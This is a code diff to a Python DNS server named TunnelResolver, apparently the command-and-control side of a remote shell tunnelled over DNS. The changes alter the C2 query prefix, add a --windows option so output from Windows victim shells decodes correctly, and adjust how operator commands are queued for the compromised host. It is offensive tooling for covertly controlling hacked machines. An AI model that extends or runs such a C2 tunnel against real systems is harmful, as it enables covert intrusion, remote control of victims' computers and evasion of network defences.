@@ -50,7 +50,7 @@ class TunnelResolver(BaseResolver):
     def resolve(self, request, handler):
         reply = request.reply()
         qname = request.q.qname
-        cc_record = "cmd.in." + domain + "."
+        cc_record = "in." + domain + "."
         qstr = str(qname)
         if cc_record in qstr:
             try:
@@ -113,7 +113,10 @@ class TunnelResolver(BaseResolver):
         missing_packet = False
         for i in range(self.__seq_num + 1):
             if i in self.__buffer:
-                print_buffer(self.__buffer[i].decode("ascii"))
+                if args.windows:
+                    print_buffer(self.__buffer[i].decode("cp1252").replace("\r\n","\n"))
+                else:
+                    print_buffer(self.__buffer[i].decode("ascii"))
             else:
                 missing_packet = True
 
@@ -138,6 +141,9 @@ p.add_argument("--log", default="truncated,error",
                help="Log hooks to enable (default: +request,+reply,+truncated,+error,-recv,-send,-data)")
 p.add_argument("--log-prefix", action='store_true', default=False,
                help="Log prefix (timestamp/handler/resolver) (default: False)")
+
+p.add_argument("--windows", "-w", action='store_true', default=False,
+               help="Make sure the shell is compatible with Windows (default: False)")
 
 args = p.parse_args()
 resolver = TunnelResolver()
@@ -208,7 +214,8 @@ def accept(buff):
         elif command == "exit":
             application.exit()
         else:
-            print_buffer(command + "\n")
+            if not args.windows:
+                print_buffer(command + "\n")
             q_commands.put(command)
 
 
